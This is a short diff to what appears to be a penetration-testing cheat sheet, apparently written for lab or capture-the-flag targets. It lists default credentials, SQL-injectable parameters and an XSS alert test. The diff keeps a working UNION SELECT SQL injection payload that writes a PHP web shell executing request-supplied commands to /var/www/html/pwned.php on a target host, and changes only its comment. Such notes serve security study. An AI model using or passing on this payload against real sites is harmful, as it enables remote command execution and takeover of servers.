@@ -121,8 +121,7 @@ Things to be on look for:
 
 > $ Default credentials for software  
 > $ SQL-injectable GET/POST params  
-> Union Select webshell
-> $ http://10.10.10.143/room.php?cod=-1 union select 1,'<?phpsystem($_REQUEST["exec"]);?>',3,4,5,6,7 into outfile '/var/www/html/pwned.php' #payload goes into printed column, 1-x based on column count 
+> $ http://10.10.10.143/room.php?cod=-1 union select 1,'<?phpsystem($_REQUEST["exec"]);?>',3,4,5,6,7 into outfile '/var/www/html/pwned.php' #lmao theres php here check source
 > $ XSS  
 > Test  
 > $ &lt;script&gt; alert\("Hello! I am an alert box!!"\);&lt;/script&gt;  
